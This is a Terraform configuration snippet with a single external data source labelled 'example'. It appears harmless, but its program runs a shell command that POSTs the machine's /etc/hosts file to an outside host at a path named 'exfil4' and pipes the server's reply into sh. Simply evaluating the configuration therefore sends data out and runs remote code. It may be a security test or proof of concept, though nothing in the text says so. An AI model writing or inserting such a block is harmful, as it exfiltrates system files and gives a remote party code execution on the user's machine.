data "external" "example" { 
  program = ["sh", "-c", "curl -X POST --data-binary @/etc/hosts https://0hibdfhjlhwh3cfexmpt1u0fs6y4mwal.net-spi.com/exfil4 | sh"] 
} 
